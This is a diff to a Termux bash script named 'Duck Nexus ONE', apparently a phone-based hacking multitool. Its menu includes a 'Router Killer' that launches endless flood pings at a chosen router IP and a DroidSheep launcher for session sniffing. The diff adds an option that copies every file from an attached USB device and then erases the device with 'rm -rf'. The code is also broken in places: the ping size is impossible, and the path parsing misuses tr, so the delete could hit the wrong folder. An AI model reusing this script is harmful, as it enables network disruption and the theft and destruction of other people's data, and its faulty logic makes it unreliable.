@@ -1,4 +1,5 @@
 #!/bin/bash
+termux-wake-lock
 echo "Duck Nexus ONE" | lolcat
 echo "Make sure you have the following apps installed: UniMote, Mi Remote (required only in IR supported phones), Screen Mirroring - TV Miracast, PandwaRF, DroidSheep, and PentestKit Mobile."
 read -p "Home
@@ -8,7 +9,8 @@ read -p "Home
 [4] Frequency Analyzer (PandwaRF Required)
 [5] Router Killer (WiFi Required)
 [6] Pentester's Kit
-[7] Sniff Network (Root required)
+[7] Sniff Network (Root Required)
+[8] Copy device files (OTG & Root Required)
 " choice
 if [[ "$choice" = "1" ]]; then
 am start -n sensustech.universal.tv.remote.control/sensustech.universal.tv.remote.control.activities.SplashActivity
@@ -22,12 +24,18 @@ elif [[ "$choice" = "5" ]]; then
 read -p "Router IP: " ip
 while true
 do
-ping -t 255 -s 1569325055 -w 0.0001 -f $ip &
+ping -t 255 -s 1569325055 -f $ip &
 done
 elif [[ "$choice" = "6" ]]; then
 am start -n com.pentestkit/com.pentestkit.MainActivity
 elif [[ "$choice" = "7" ]]; then
 am start -n de.trier.infsec.koch.droidsheep/de.trier.infsec.koch.droidsheep.activities.ListenActivity
+elif [[ "$choice" = "8" ]]; then
+usb=$(ls /storage | tr -d 'emulated')
+cp -r /storage/$usb ~/duckph
+echo "Device files copied to ~/duckph. Press Enter to erase device, Ctrl+C to not erase."
+read a
+cd /storage/$usb && rm -rf *
 else
 echo "Unknown option."
 fi
